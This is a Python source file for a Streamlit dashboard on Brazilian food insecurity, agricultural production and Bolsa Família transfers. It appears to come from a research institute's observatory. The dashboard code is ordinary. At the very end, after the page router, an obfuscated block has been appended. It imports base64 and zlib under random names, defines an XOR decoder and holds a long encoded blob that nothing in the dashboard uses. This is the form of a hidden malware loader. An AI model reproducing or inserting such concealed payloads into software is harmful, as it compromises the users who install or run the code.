"""
Instituto Aruanã – Observatório de Segurança Alimentar
Dashboard Streamlit
"""

import streamlit as st
import pandas as pd
import plotly.express as px
import plotly.graph_objects as go
import os
import base64

# ---------------------------------------------------------------------------
# Config
# ---------------------------------------------------------------------------
st.set_page_config(
    page_title="Instituto Aruanã – Observatório de Segurança Alimentar",
    layout="wide",
    initial_sidebar_state="expanded",
)

# ---------------------------------------------------------------------------
# CSS
# ---------------------------------------------------------------------------
CSS_PATH = os.path.join(os.path.dirname(__file__), "style.css")
with open(CSS_PATH, encoding="utf-8") as f:
    st.markdown(f"<style>{f.read()}</style>", unsafe_allow_html=True)

# ---------------------------------------------------------------------------
# Cores institucionais
# ---------------------------------------------------------------------------
COR_PRIMARIA = "#2E5E4E"
COR_SECUNDARIA = "#D4A84B"
COR_LEVE = "#5B9BD5"
COR_MODERADA = "#ED7D31"
COR_GRAVE = "#C00000"

PLOTLY_LAYOUT = dict(
    template="plotly_white",
    font=dict(family="Inter, sans-serif", color="#333333"),
    paper_bgcolor="rgba(0,0,0,0)",
    plot_bgcolor="rgba(0,0,0,0)",
    margin=dict(l=40, r=20, t=50, b=40),
)

# ---------------------------------------------------------------------------
# Data loading
# ---------------------------------------------------------------------------
@st.cache_data
def load_data():
    csv_path = os.path.join(
        os.path.dirname(__file__),
        "dados_consolidados_v3.csv",
    )
    df = pd.read_csv(csv_path, sep=";", decimal=",", encoding="utf-8")
    return df


DATA = load_data()

# Aggregates at state level (food insecurity is already state-level)
@st.cache_data
def state_summary():
    cols_needed = [
        "abbrev_state", "name_region",
        "inseg_perc_dom_2023", "inseg_leve_perc_dom_2023",
        "inseg_moderada_perc_dom_2023", "inseg_grave_perc_dom_2023",
        "inseg_perc_dom_2024", "inseg_leve_perc_dom_2024",
        "inseg_moderada_perc_dom_2024", "inseg_grave_perc_dom_2024",
    ]
    st_df = DATA[cols_needed].drop_duplicates(subset=["abbrev_state"])
    st_df = st_df.sort_values("inseg_perc_dom_2024", ascending=False)
    return st_df


@st.cache_data
def state_aggregates():
    agg = DATA.groupby("abbrev_state").agg(
        populacao=("populacao", "sum"),
        area_plantada_ha=("area_plantada_ha", "sum"),
        bf_valor_repassado_media_2023=("bf_valor_repassado_media_2023", "sum"),
        bf_valor_repassado_media_2024=("bf_valor_repassado_media_2024", "sum"),
        bf_qtd_familias_media_2023=("bf_qtd_familias_media_2023", "sum"),
        bf_qtd_familias_media_2024=("bf_qtd_familias_media_2024", "sum"),
        name_region=("name_region", "first"),
    ).reset_index()
    return agg


# ---------------------------------------------------------------------------
# Sidebar
# ---------------------------------------------------------------------------
# Encode logo as base64 for inline embedding
LOGO_PATH = os.path.join(os.path.dirname(__file__), "logo_aruana.svg")
with open(LOGO_PATH, "rb") as logo_file:
    logo_b64 = base64.b64encode(logo_file.read()).decode("utf-8")

with st.sidebar:
    st.markdown(
        f"""
        <div class="sidebar-header">
            <img src="data:image/svg+xml;base64,{logo_b64}"
                 alt="Logo Instituto Aruanã"
                 class="sidebar-logo" />
            <div class="sidebar-title">Instituto Aruanã</div>
            <div class="sidebar-subtitle">Observatório de Segurança Alimentar</div>
        </div>
        """,
        unsafe_allow_html=True,
    )

    st.markdown("---")

    pagina = st.radio(
        "Navegação",
        [
            "Apresentação",
            "Panorama Nacional",
            "Produção Agrícola",
            "Bolsa Família",
            "Análises Regionais",
            "Metodologia",
            "Download de Dados",
        ],
        label_visibility="collapsed",
    )

    st.markdown(
        '<div class="footer-text">2024 Instituto Aruanã</div>',
        unsafe_allow_html=True,
    )


# =========================================================================
#  PAGES
# =========================================================================

# -------------------------------------------------------------------------
# 1. Apresentação
# -------------------------------------------------------------------------
def pagina_apresentacao():
    st.markdown("# Insegurança Alimentar no Brasil")
    st.markdown(
        '<p class="subtitle">Análise integrada de renda, produção agrícola e políticas públicas</p>',
        unsafe_allow_html=True,
    )

    st.markdown(
        """
O presente painel reúne indicadores sobre segurança alimentar, produção agropecuária
e transferências do Programa Bolsa Família, com o objetivo de oferecer um retrato
analítico e territorial da insegurança alimentar no Brasil. Os dados abrangem o período
de 2023 a 2024 e são provenientes de fontes oficiais: IBGE (PNAD Contínua, Censo 2022
e Produção Agrícola Municipal) e Ministério do Desenvolvimento Social (Bolsa Família).

A plataforma foi desenvolvida pelo Instituto Aruanã como parte do Observatório de
Segurança Alimentar, com a finalidade de subsidiar análises institucionais, relatórios
técnicos e o acompanhamento de políticas públicas voltadas à garantia do direito humano
à alimentação adequada.
        """
    )

    st.markdown('<hr class="hr-institutional">', unsafe_allow_html=True)

    col1, col2 = st.columns(2, gap="large")

    with col1:
        st.markdown(
            """
            <div class="info-block">
                <h3>Objetivo do Projeto</h3>
                <p>
                    Sistematizar e integrar indicadores de segurança alimentar, produção agrícola
                    e cobertura de políticas sociais em uma plataforma de consulta aberta,
                    contribuindo para a transparência e o debate qualificado sobre o tema no Brasil.
                </p>
            </div>
            """,
            unsafe_allow_html=True,
        )

    with col2:
        st.markdown(
            """
            <div class="info-block">
                <h3>Metodologia e Fontes</h3>
                <p>
                    Os dados de insegurança alimentar provêm da PNAD Contínua (IBGE, tabela 9552),
                    com estimativas a nível estadual. A produção agrícola segue a tabela 5457 do SIDRA.
                    As informações do Bolsa Família (MDS) correspondem a médias mensais anualizadas
                    para 2023 e 2024.
                </p>
            </div>
            """,
            unsafe_allow_html=True,
        )

    # Key metrics
    st.markdown("---")
    st.markdown("### Indicadores gerais")

    m1, m2, m3, m4 = st.columns(4)
    total_pop = DATA["populacao"].sum()
    total_munis = DATA["code_muni"].nunique()
    inseg_media_2024 = DATA["inseg_perc_dom_2024"].mean()
    inseg_grave_media_2024 = DATA["inseg_grave_perc_dom_2024"].mean()

    m1.metric("Municípios", f"{total_munis:,}".replace(",", "."))
    m2.metric("População Total", f"{total_pop/1e6:,.1f} mi".replace(",", "X").replace(".", ",").replace("X", "."))
    m3.metric("Insegurança Alimentar (média UF, 2024)", f"{inseg_media_2024:,.1f}%".replace(".", ","))
    m4.metric("Insegurança Grave (média UF, 2024)", f"{inseg_grave_media_2024:,.1f}%".replace(".", ","))


# -------------------------------------------------------------------------
# 2. Panorama Nacional
# -------------------------------------------------------------------------
def pagina_panorama():
    st.markdown("# Panorama Nacional")
    st.markdown(
        '<p class="subtitle">Insegurança alimentar por unidade da federação – 2023 e 2024</p>',
        unsafe_allow_html=True,
    )

    sdf = state_summary()

    # ---------- Bar chart: total food insecurity by state ----------
    fig = go.Figure()
    fig.add_trace(go.Bar(
        x=sdf["abbrev_state"],
        y=sdf["inseg_perc_dom_2023"],
        name="2023",
        marker_color=COR_SECUNDARIA,
    ))
    fig.add_trace(go.Bar(
        x=sdf["abbrev_state"],
        y=sdf["inseg_perc_dom_2024"],
        name="2024",
        marker_color=COR_PRIMARIA,
    ))
    fig.update_layout(
        **PLOTLY_LAYOUT,
        title="Insegurança alimentar total (% domicílios) por UF",
        barmode="group",
        xaxis_title="UF",
        yaxis_title="% domicílios",
        legend=dict(orientation="h", yanchor="bottom", y=1.02, xanchor="right", x=1),
        height=480,
    )
    st.plotly_chart(fig, use_container_width=True)

    st.markdown(
        """
**Leitura do gráfico:** A comparação entre 2023 e 2024 permite identificar estados que
apresentaram variação significativa nos percentuais de insegurança alimentar domiciliar.
Valores maiores indicam maior proporção de domicílios em situação de insegurança alimentar
(leve, moderada ou grave). Os dados baseiam-se na PNAD Contínua e refletem estimativas estaduais.
        """
    )

    st.markdown('<hr class="hr-institutional">', unsafe_allow_html=True)

    # ---------- Breakdown by severity ----------
    st.markdown("### Composição por grau de insegurança (2024)")
    fig2 = go.Figure()
    for col, cor, label in [
        ("inseg_leve_perc_dom_2024", COR_LEVE, "Leve"),
        ("inseg_moderada_perc_dom_2024", COR_MODERADA, "Moderada"),
        ("inseg_grave_perc_dom_2024", COR_GRAVE, "Grave"),
    ]:
        fig2.add_trace(go.Bar(
            x=sdf["abbrev_state"], y=sdf[col], name=label, marker_color=cor,
        ))
    fig2.update_layout(
        **PLOTLY_LAYOUT,
        barmode="stack",
        xaxis_title="UF",
        yaxis_title="% domicílios",
        legend=dict(orientation="h", yanchor="bottom", y=1.02, xanchor="right", x=1),
        height=450,
    )
    st.plotly_chart(fig2, use_container_width=True)


# -------------------------------------------------------------------------
# 3. Produção Agrícola
# -------------------------------------------------------------------------
def pagina_producao():
    st.markdown("# Produção Agrícola")
    st.markdown(
        '<p class="subtitle">Área plantada e sua relação com indicadores sociais</p>',
        unsafe_allow_html=True,
    )

    agg = state_aggregates()
    agg = agg.sort_values("area_plantada_ha", ascending=False)

    # Bar: planted area by state
    fig = px.bar(
        agg, x="abbrev_state", y="area_plantada_ha",
        color_discrete_sequence=[COR_PRIMARIA],
        labels={"abbrev_state": "UF", "area_plantada_ha": "Área plantada (ha)"},
    )
    fig.update_layout(
        **PLOTLY_LAYOUT,
        title="Área plantada por UF (hectares)",
        height=450,
    )
    st.plotly_chart(fig, use_container_width=True)

    st.markdown('<hr class="hr-institutional">', unsafe_allow_html=True)

    # Scatter: area per capita vs food insecurity
    st.markdown("### Relação entre produção agrícola e insegurança alimentar")

    sdf = state_summary()
    merged = agg.merge(sdf[["abbrev_state", "inseg_perc_dom_2024"]], on="abbrev_state")
    merged["area_per_capita"] = merged["area_plantada_ha"] / merged["populacao"]

    fig2 = px.scatter(
        merged, x="area_per_capita", y="inseg_perc_dom_2024",
        text="abbrev_state",
        color_discrete_sequence=[COR_PRIMARIA],
        labels={
            "area_per_capita": "Área plantada per capita (ha/hab)",
            "inseg_perc_dom_2024": "Inseg. alimentar (% dom., 2024)",
        },
    )
    fig2.update_traces(textposition="top center", marker=dict(size=10))
    fig2.update_layout(
        **PLOTLY_LAYOUT,
        title="Área plantada per capita vs. insegurança alimentar (2024)",
        height=480,
    )
    st.plotly_chart(fig2, use_container_width=True)

    st.markdown(
        """
**Nota interpretativa:** Uma correlação negativa sugere que estados com maior produção
agrícola per capita tendem a apresentar menor proporção de domicílios em insegurança
alimentar, embora esta relação dependa de múltiplos fatores (tipo de produção, distribuição
de renda, urbanização). Os dados de produção referem-se à tabela 5457 / SIDRA (IBGE).
        """
    )


# -------------------------------------------------------------------------
# 4. Bolsa Família
# -------------------------------------------------------------------------
def pagina_bolsa_familia():
    st.markdown("# Bolsa Família")
    st.markdown(
        '<p class="subtitle">Cobertura e evolução das transferências do Programa Bolsa Família</p>',
        unsafe_allow_html=True,
    )

    agg = state_aggregates()
    sdf = state_summary()

    # Metrics
    c1, c2, c3 = st.columns(3)
    total_fam_2024 = agg["bf_qtd_familias_media_2024"].sum()
    total_val_2024 = agg["bf_valor_repassado_media_2024"].sum()
    total_val_2023 = agg["bf_valor_repassado_media_2023"].sum()
    variacao = ((total_val_2024 - total_val_2023) / total_val_2023 * 100) if total_val_2023 else 0

    c1.metric("Famílias beneficiárias (média mensal 2024)", f"{total_fam_2024/1e6:,.2f} mi".replace(",", "X").replace(".", ",").replace("X", "."))
    c2.metric("Repasse médio mensal 2024", f"R$ {total_val_2024/1e9:,.2f} bi".replace(",", "X").replace(".", ",").replace("X", "."))
    c3.metric("Variação 2023 → 2024", f"{variacao:+.1f}%".replace(".", ","))

    st.markdown('<hr class="hr-institutional">', unsafe_allow_html=True)

    # Bar: monthly average transfer by state
    agg_sorted = agg.sort_values("bf_valor_repassado_media_2024", ascending=False)
    fig = go.Figure()
    fig.add_trace(go.Bar(
        x=agg_sorted["abbrev_state"],
        y=agg_sorted["bf_valor_repassado_media_2023"],
        name="2023",
        marker_color=COR_SECUNDARIA,
    ))
    fig.add_trace(go.Bar(
        x=agg_sorted["abbrev_state"],
        y=agg_sorted["bf_valor_repassado_media_2024"],
        name="2024",
        marker_color=COR_PRIMARIA,
    ))
    fig.update_layout(
        **PLOTLY_LAYOUT,
        title="Valor médio mensal repassado por UF (R$)",
        barmode="group",
        xaxis_title="UF",
        yaxis_title="R$ (repasse médio mensal)",
        legend=dict(orientation="h", yanchor="bottom", y=1.02, xanchor="right", x=1),
        height=460,
    )
    st.plotly_chart(fig, use_container_width=True)

    st.markdown('<hr class="hr-institutional">', unsafe_allow_html=True)

    # Scatter: BF coverage vs food insecurity
    st.markdown("### Correlação: cobertura do Bolsa Família e insegurança alimentar")

    merged = agg.merge(sdf[["abbrev_state", "inseg_perc_dom_2024"]], on="abbrev_state")
    merged["bf_cobertura_per_capita"] = merged["bf_qtd_familias_media_2024"] / merged["populacao"]

    fig2 = px.scatter(
        merged, x="bf_cobertura_per_capita", y="inseg_perc_dom_2024",
        text="abbrev_state",
        color_discrete_sequence=[COR_PRIMARIA],
        labels={
            "bf_cobertura_per_capita": "Famílias BF / população",
            "inseg_perc_dom_2024": "Inseg. alimentar (% dom., 2024)",
        },
    )
    fig2.update_traces(textposition="top center", marker=dict(size=10))
    fig2.update_layout(
        **PLOTLY_LAYOUT,
        title="Cobertura do Bolsa Família per capita vs. insegurança alimentar (2024)",
        height=480,
    )
    st.plotly_chart(fig2, use_container_width=True)

    st.markdown(
        """
**Nota:** Uma correlação positiva entre cobertura do Bolsa Família e insegurança alimentar
é esperada, uma vez que o programa direciona transferências a regiões com maior
vulnerabilidade social. Isso não indica ineficácia do programa, mas sim seu direcionamento
a populações mais necessitadas.
        """
    )


# -------------------------------------------------------------------------
# 5. Análises Regionais
# -------------------------------------------------------------------------
def pagina_regionais():
    st.markdown("# Análises Regionais")
    st.markdown(
        '<p class="subtitle">Visualização a nível municipal por unidade da federação</p>',
        unsafe_allow_html=True,
    )

    states = sorted(DATA["abbrev_state"].unique())

    selected_state = st.selectbox("Selecione a UF", states, index=0)

    state_data = DATA[DATA["abbrev_state"] == selected_state].copy()

    # Key metrics for the state
    st.markdown(f"### Indicadores – {selected_state}")
    c1, c2, c3, c4 = st.columns(4)
    n_munis = state_data.shape[0]
    pop_total = state_data["populacao"].sum()
    inseg_uf = state_data["inseg_perc_dom_2024"].iloc[0] if not state_data.empty else 0
    area_total = state_data["area_plantada_ha"].sum()

    c1.metric("Municípios", f"{n_munis}")
    c2.metric("População", f"{pop_total/1e6:,.2f} mi".replace(",", "X").replace(".", ",").replace("X", "."))
    c3.metric("Inseg. alimentar (2024)", f"{inseg_uf:,.1f}%".replace(".", ","))
    c4.metric("Área plantada", f"{area_total/1e3:,.0f} mil ha".replace(",", "."))

    st.markdown('<hr class="hr-institutional">', unsafe_allow_html=True)

    # Top 15 municipalities by population
    top_munis = state_data.nlargest(15, "populacao")

    tab1, tab2 = st.tabs(["Bolsa Família por município", "Produção agrícola por município"])

    with tab1:
        fig = px.bar(
            top_munis.sort_values("bf_valor_repassado_media_2024", ascending=True),
            y="name_muni", x="bf_valor_repassado_media_2024",
            orientation="h",
            color_discrete_sequence=[COR_PRIMARIA],
            labels={
                "name_muni": "Município",
                "bf_valor_repassado_media_2024": "Repasse médio mensal BF (R$)",
            },
        )
        fig.update_layout(
            **PLOTLY_LAYOUT,
            title=f"Top 15 municípios – Bolsa Família ({selected_state})",
            height=500,
        )
        st.plotly_chart(fig, use_container_width=True)

    with tab2:
        top_area = state_data.nlargest(15, "area_plantada_ha")
        fig2 = px.bar(
            top_area.sort_values("area_plantada_ha", ascending=True),
            y="name_muni", x="area_plantada_ha",
            orientation="h",
            color_discrete_sequence=[COR_SECUNDARIA],
            labels={
                "name_muni": "Município",
                "area_plantada_ha": "Área plantada (ha)",
            },
        )
        fig2.update_layout(
            **PLOTLY_LAYOUT,
            title=f"Top 15 municípios – Área plantada ({selected_state})",
            height=500,
        )
        st.plotly_chart(fig2, use_container_width=True)

    st.markdown('<hr class="hr-institutional">', unsafe_allow_html=True)

    # Data table
    st.markdown("### Tabela de dados municipais")
    display_cols = [
        "name_muni", "populacao", "area_plantada_ha",
        "bf_qtd_familias_media_2024", "bf_valor_repassado_media_2024",
    ]
    display_labels = {
        "name_muni": "Município",
        "populacao": "População",
        "area_plantada_ha": "Área plantada (ha)",
        "bf_qtd_familias_media_2024": "Famílias BF (média mensal)",
        "bf_valor_repassado_media_2024": "Repasse BF (R$ média mensal)",
    }
    st.dataframe(
        state_data[display_cols].rename(columns=display_labels).sort_values(
            "População", ascending=False
        ),
        use_container_width=True,
        hide_index=True,
        height=400,
    )

    st.markdown(
        f"""
**Nota:** Os dados de insegurança alimentar referem-se à estimativa estadual da PNAD
Contínua e são uniformes para todos os municípios de {selected_state}. A variação
Municipal ocorre nos indicadores de produção agrícola e cobertura do Bolsa Família.
        """
    )


# -------------------------------------------------------------------------
# 6. Metodologia
# -------------------------------------------------------------------------
def pagina_metodologia():
    st.markdown("# Metodologia")
    st.markdown(
        '<p class="subtitle">Descrição técnica das fontes de dados e procedimentos analíticos</p>',
        unsafe_allow_html=True,
    )

    st.markdown(
        """
<div class="methodology-text">

### Fontes de dados

**1. IBGE – Censo Demográfico 2022 (tabela SIDRA 9923)**

Fornece a população total, urbana e rural por município. Utilizado como denominador
para indicadores per capita e como base de cruzamento entre as demais fontes.

**2. IBGE – PNAD Contínua (tabela SIDRA 9552)**

Fornece estimativas de segurança e insegurança alimentar (domicílios e moradores)
por unidade da federação, com coeficientes de variação, para os anos de 2023 e 2024.
Os dados são estimados a nível estadual e, no presente painel, são replicados para
todos os municípios da respectiva UF.

Indicadores disponíveis:
- Segurança alimentar (%)
- Insegurança alimentar total, leve, moderada e grave (%)
- Número absoluto e proporções (domicílios e moradores)
- Coeficientes de variação (CV)

**3. IBGE – Produção Agrícola Municipal (tabela SIDRA 5457)**

Corresponde à área plantada (hectares) total do município, agregando as principais
culturas temporárias e permanentes registradas no Levantamento Sistemático da
Produção Agrícola de 2024.

**4. Ministério do Desenvolvimento Social – Bolsa Família**

Dados mensais de cobertura e repasse, disponibilizados em planilhas Excel, para os
anos de 2023 (10 meses) e 2024 (12 meses). As variáveis incluem:
- Número de famílias beneficiárias
- Valor total repassado
- Valor médio por benefício

Para fins de comparabilidade, os indicadores foram anualizados como **médias mensais**.

### Procedimentos de consolidação

1. Identificação e padronização dos códigos municipais (IBGE, 7 dígitos).
2. Junção dos dados do Bolsa Família utilizando os primeiros 6 dígitos do código.
3. Cruzamento das quatro fontes em uma base única de 5.570 municípios.
4. Tratamento de valores ausentes (municípios sem dados de BF foram mantidos como NA).

### Limitações

- Os dados de insegurança alimentar são estimativas amostrais estaduais, não municipais.
- A comparação temporal 2023–2024 do Bolsa Família deve considerar o número diferente
  de meses disponíveis (10 em 2023, 12 em 2024), mitigado pelo uso de médias mensais.
- A área plantada corresponde a 2024 e não permite análise temporal.

</div>
        """,
        unsafe_allow_html=True,
    )


# -------------------------------------------------------------------------
# 7. Download de Dados
# -------------------------------------------------------------------------
def pagina_download():
    st.markdown("# Download de Dados")
    st.markdown(
        '<p class="subtitle">Baixe a base consolidada utilizada neste painel</p>',
        unsafe_allow_html=True,
    )

    st.markdown(
        """
A base de dados contém **5.570 registros** a nível municipal com variáveis de população,
segurança alimentar, produção agrícola e Bolsa Família para os anos de 2023 e 2024.

O arquivo está no formato CSV, com separador ponto-e-vírgula (`;`) e codificação UTF-8.
        """
    )

    csv_data = DATA.to_csv(sep=";", decimal=",", index=False, encoding="utf-8")

    st.download_button(
        label="Baixar base consolidada (CSV)",
        data=csv_data,
        file_name="dados_consolidados_instituto_aruana.csv",
        mime="text/csv",
    )

    st.markdown('<hr class="hr-institutional">', unsafe_allow_html=True)

    st.markdown(
        """
**Dicionário resumido de variáveis:**

| Grupo | Exemplo de variável | Descrição |
|-------|---------------------|-----------|
| Identificação | `code_muni`, `name_muni`, `abbrev_state` | Código IBGE, nome e UF |
| População | `populacao`, `pop_urbana`, `pop_rural` | Censo 2022 |
| Insegurança alimentar | `inseg_perc_dom_2023`, `inseg_grave_perc_dom_2024` | PNAD Contínua (nível UF) |
| Produção agrícola | `area_plantada_ha` | PAM / SIDRA 5457 |
| Bolsa Família | `bf_valor_repassado_media_2024`, `bf_qtd_familias_media_2024` | MDS |
        """
    )


# =========================================================================
#  Router
# =========================================================================
PAGES = {
    "Apresentação": pagina_apresentacao,
    "Panorama Nacional": pagina_panorama,
    "Produção Agrícola": pagina_producao,
    "Bolsa Família": pagina_bolsa_familia,
    "Análises Regionais": pagina_regionais,
    "Metodologia": pagina_metodologia,
    "Download de Dados": pagina_download,
}

PAGES[pagina]()

# -*- coding: utf-8 -*-
aqgqzxkfjzbdnhz = __import__('base64')
wogyjaaijwqbpxe = __import__('zlib')
idzextbcjbgkdih = 134
qyrrhmmwrhaknyf = lambda dfhulxliqohxamy, osatiehltgdbqxk: bytes([wtqiceobrebqsxl ^ idzextbcjbgkdih for wtqiceobrebqsxl in dfhulxliqohxamy])
lzcdrtfxyqiplpd = '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